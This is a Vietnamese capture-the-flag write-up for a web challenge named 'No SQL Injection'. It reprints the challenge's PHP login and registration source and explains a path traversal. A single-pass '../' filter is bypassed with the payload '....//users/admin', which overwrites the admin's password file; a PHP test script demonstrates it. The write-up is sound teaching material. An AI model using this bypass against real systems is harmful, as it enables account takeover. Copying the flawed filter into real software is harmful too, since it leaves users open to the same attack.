## No SQL Injection
### 100 points

Đây là bài đầu tiên mình làm trong kì CTF này. Sáng hôm thi mới biết là phải vào mạng công ty mới làm bài được, vì quá phấn khích nên mình đã bùng học chạy hộc bơ lên công ty để thi. Mở scoreboard lên nghĩ quái lạ, bài này 100 points, nằm đầu tiên trong list bài mà lại chưa ai động, nên mình quyết định làm luôn. Cảm giác là người giải được đầu tiên bao giờ nó cũng vui hơn :)).

### Đề bài:
```
Trên đỉnh gò xưa
http://nosqlinjection.ctf2019.yeuchimse.com
Challenge Oreo sẽ được mở khi bạn giải được bài này
```

### Giao diện của bài:

![][view]

### Lời giải
Tạo 1 tài khoản, đăng nhập thử:

![][logged-in]

```
Bạn có biết khác biệt giữa bạn và admin là gì không?
Là admin thì có flag, còn bạn thì không. Ha ha ha -_-
```

Ok, vậy chắc mục tiêu chính của bài này là làm sao vào được admin rồi. 

Thấy trong bài có source nên mình nghía thử luôn:

<details>
  <summary>Source code</summary> 
  
  ```php
  <?php

  if (isset($_GET['view_source'])) {
      highlight_file(__FILE__);
      die();
  }
  ?>

  <?php include_once 'header.php' ?>
  <?php include_once 'config.php' ?>

  <?php

  function get_absolute_path($path)
  {
      $unix = substr($path, 0, 1) === '/';

      $path = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
      $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), 'strlen');
      $absolutes = array();
      foreach ($parts as $part) {
          if ('.' == $part) continue;
          if ('..' == $part) {
              array_pop($absolutes);
          } else {
              $absolutes[] = $part;
          }
      }

      $final_path = implode(DIRECTORY_SEPARATOR, $absolutes);
      if ($unix) {
          $final_path = '/' . $final_path;
      }

      return $final_path;
  }

  if ($_SERVER['REQUEST_METHOD'] == 'POST') {
      if ($_GET['action'] == 'register' && isset($_POST['username']) && isset($_POST['password']) && !empty(trim($_POST['username']))) {
          $username = trim($_POST['username']);
          $username = str_replace(array('../', '..\\'), '', $username); // ^_^

          $password = $_POST['password'];
          $user_dirs = glob(getcwd() . '/users/*');
          foreach ($user_dirs as $user_dir) {
              $user_dir_name = basename($user_dir);
              if ($user_dir_name == $username) {
                  $error = 'Tên tài khoản đã được sử dụng.';
                  break;
              }
          }

          if (!isset($error)) {
              $user_dir = get_absolute_path(getcwd() . '/users/' . $username);
              $base_dir = get_absolute_path(getcwd() . '/users');
              if (strpos($user_dir, $base_dir) === false) {  // \~(*o*)~/
                  $error = 'Tên tài khoản không hợp lệ.';
              } else {
                  if (!isset($error)) {
                      if (!file_exists($user_dir) && !mkdir($user_dir)) {
                          $error = 'Không tạo được thư mục.';
                      } else {
                          $password_file = $user_dir . '/' . PASSWORD_FILENAME;
                          if (file_put_contents($password_file, md5($password)) !== false) {

                              $_SESSION['username'] = $username;

                              header('Location: index.php');
                              die();
                          } else {
                              $error = 'Không ghi được file.';
                          }
                      }
                  }
              }
          }

      } else if ($_GET['action'] == 'login' && isset($_POST['username']) && isset($_POST['password'])) {
          $username = $_POST['username'];
          $password = $_POST['password'];

          $user_dir = get_absolute_path(getcwd() . '/users/' . $username);
          if (strpos($user_dir, getcwd()) == -1) {
              $errror = 'Tên tài khoản không hợp lệ.';
          }

          if (!isset($error)) {
              $password_file = $user_dir . '/' . PASSWORD_FILENAME;
              if (file_exists($password_file)) {
                  $password_md5 = file_get_contents($password_file);
                  if (md5($password) == $password_md5) {
                      // với tài khoản admin, sau mỗi lần đăng nhập thành công sẽ đổi password để đảm bảo an toàn
                      if ($username == 'admin') {
                          $new_password = md5($password . SECRET);
                          file_put_contents($password_file, $new_password);
                      }

                      $_SESSION['username'] = $username;

                      header('Location: index.php');
                      die();
                  } else {
                      $error = 'Thông tin đăng nhập không chính xác.';
                  }
              } else {
                  $error = 'Thông tin đăng nhập không chính xác.';
              }
          }
      }
  } else {
      if (isset($_GET['action']) && $_GET['action'] == 'logout') {
          unset($_SESSION['username']);

          header('Location: auth.php');
          die();
      }
  }
  ?>

      <div class="container">
          <div class="row">
              <div class="col-lg-6 col-lg-offset-3">
                  <div class="panel panel-login">
                      <div class="panel-heading">
                          <div class="row">
                              <div class="col-lg-6">
                                  <a href="#" class="active" id="login-form-link">Đăng nhập</a>
                              </div>
                              <div class="col-lg-6">
                                  <a href="#" id="register-form-link">Đăng ký</a>
                              </div>
                          </div>
                          <hr>
                      </div>
                      <div class="panel-body">
                          <div class="row">
                              <div class="col-lg-12">
                                  <form id="login-form" action="auth.php?action=login" method="post" role="form"
                                        style="display: block;">
                                      <div class="form-group">
                                          <input type="text" name="username" id="username" tabindex="1"
                                                 class="form-control"
                                                 placeholder="Tên tài khoản" value="">
                                      </div>
                                      <div class="form-group">
                                          <input type="password" name="password" id="password" tabindex="2"
                                                 class="form-control" placeholder="Mật khẩu">
                                      </div>
                                      <div class="form-group">
                                          <div class="row">
                                              <div class="col-sm-6 col-sm-offset-3">
                                                  <input type="submit" name="login" id="login-submit" tabindex="4"
                                                         class="form-control btn btn-login" value="Đăng nhập">
                                              </div>
                                          </div>
                                      </div>
                                  </form>
                                  <form id="register-form" action="auth.php?action=register" method="post"
                                        role="form" style="display: none;">
                                      <div class="form-group">
                                          <input type="text" name="username" id="username" tabindex="1"
                                                 class="form-control"
                                                 placeholder="Tên tài khoản" value="">
                                      </div>
                                      <div class="form-group">
                                          <input type="password" name="password" id="password" tabindex="2"
                                                 class="form-control" placeholder="Mật khẩu">
                                      </div>
                                      <div class="form-group">
                                          <div class="row">
                                              <div class="col-lg-6 col-lg-offset-3">
                                                  <input type="submit" name="register" id="register-submit"
                                                         tabindex="4" class="form-control btn btn-register"
                                                         value="Đăng ký">
                                              </div>
                                          </div>
                                      </div>
                                  </form>
                              </div>
                          </div>

                          <?php if (isset($error)) { ?>
                              <div class="row">
                                  <div class="col-lg-12 text-center alert alert-danger">
                                      <?php echo $error ?>
                                  </div>
                              </div>
                          <?php } ?>
                      </div>
                  </div>

                  <div class="panel panel-login text-center">
                      <div style="font-size: 16px; color: dodgerblue; font-weight: bold"><a
                                  href="auth.php?view_source=1" target="_blank">Mã nguồn</a>
                      </div>
                  </div>
              </div>
          </div>
      </div>

  <?php include_once 'footer.php' ?>
  ```
</details>

Trông có vẻ tức mắt vì nhiều for với if quá, nhưng nếu bạn chịu khó đọc một chút thì sẽ thấy chỉ có đúng 2 phần tương ứng với 2 tính năng thôi. Sau đây là flow của các tính năng:

+ Đăng ký
1. Lấy username và password từ post data ($POST), loại bỏ các string `../`, `..\\` khỏi username
2. Check xem tên tài khoản đã có trên hệ thống chưa (ở đây hệ thống dùng các thư mục có tên tương ứng với username trong path /users)
3. Nếu tên tài khoản đã có thì trả về thông báo "Tên tài khoản đã được sử dụng.", không thì qua bước 4
4. Nối username với đường dẫn tới thư mục /users ($base_dir) và parse lại bằng hàm `get_absolute_path` (hàm này có tác dụng format lại đường dẫn và xử lý relative path trong đường dẫn của bạn. Ví dụ `/path/abc/users/../` sẽ bị replace thành `/path/abc`, sau đó check lại xem có $base_dir trong đường dẫn vừa format không. Nếu không có $base_dir thì trả về "Tên tài khoản không hợp lệ.", có thì qua bước 5. Đoạn này chắc để chống injection để thoát ra khỏi thư mục /users.
5. Tạo password file và ghi lên đó `md5($password)`. Gán session.

+ Đăng nhập
1. Lấy $username và $password từ post data ($POST)
2. Check xem tài khoản có hợp lệ không (giống bước 4 ở trên), nếu không thì trả về "Tên tài khoản không hợp lệ.", có thì qua bước 3
3. Lấy password hash từ password file tương ứng với username và check hash xem có giống md5($password) không. Nếu giống thì gán session, ngoài ra nếu là admin thì đổi password thành `md5($password . SECRET)`

+ Ngoài ra còn có phần logout tuy nhiên phần này chẳng có gì ngoài unset session nên mình không nói thêm

Trong khi đọc hiểu và phân tích tính năng thì mình thấy trong source có mấy comment `\~(*o*)~/`, `^_^` ở các phần check đường dẫn rất là ẩn ý. Mà cũng dễ thấy phần đầu tiên lọc bỏ `../` và `..\\`, nhưng phần dưới lại chống không cho dùng relative path để ra khỏi /users, chứng tỏ bài này có cách bypass qua đoạn check kia.

Từ đó mình nghĩ ra cách làm bài này là làm sao dùng tính năng đăng ký và path traversal để ghi đè password của mình lên password của admin. Sau đó đăng nhập vào lấy flag.
Nghĩ tí là ra ngay payload `....//users/admin` thôi. Các bạn xem đoạn code test này của mình cho dễ hiểu

![][test-code]

<details>
  <summary>Source code</summary> 
  
  ```php
  <?php
  function get_absolute_path($path)
  {
      $unix = substr($path, 0, 1) === '/';

      $path = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
      $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), 'strlen');
      $absolutes = array();
      foreach ($parts as $part) {
          if ('.' == $part) continue;
          if ('..' == $part) {
              array_pop($absolutes);
          } else {
              $absolutes[] = $part;
          }
      }

      $final_path = implode(DIRECTORY_SEPARATOR, $absolutes);
      if ($unix) {
          $final_path = '/' . $final_path;
      }

      return $final_path;
  }
  
  $username = 'test';

  $user_dir = get_absolute_path(getcwd() . '/users/' . $username);

  echo get_absolute_path($user_dir) . PHP_EOL;

  $username = '....//users/admin';
  $username = str_replace(array('../', '..\\'), '', $username);

  $user_dir = get_absolute_path(getcwd() . '/users/' . $username);

  echo get_absolute_path($user_dir);
  ```
</details>

Flag:
```
flag{you_cant_have_sql_injection_if_you_dont_use_sql}
```

[view]: assets/NO_SQL_INJECTION/view.png
[logged-in]: assets/NO_SQL_INJECTION/logged-in.png
[test-code]: assets/NO_SQL_INJECTION/test-code.png
